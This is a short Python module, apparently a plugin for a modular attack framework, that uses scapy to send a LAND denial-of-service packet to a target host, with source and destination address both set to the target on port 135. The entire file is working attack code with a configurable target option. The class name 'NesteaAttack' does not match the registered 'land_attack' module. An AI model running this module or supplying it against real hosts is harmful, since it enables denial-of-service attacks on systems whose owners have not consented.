from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

from module import Module, Type


class NesteaAttack(Module):

    def __init__(self):
        super().__init__("land_attack",
                         ["land", "attack", "dos", "microsoft", "windows"],
                         "land dos attack")

        self.add_option("RHOST", "target host", required=True, type=Type.host)

    def run(self):
        send(IP(src=self.rhost, dst=self.rhost) / TCP(sport=135, dport=135))
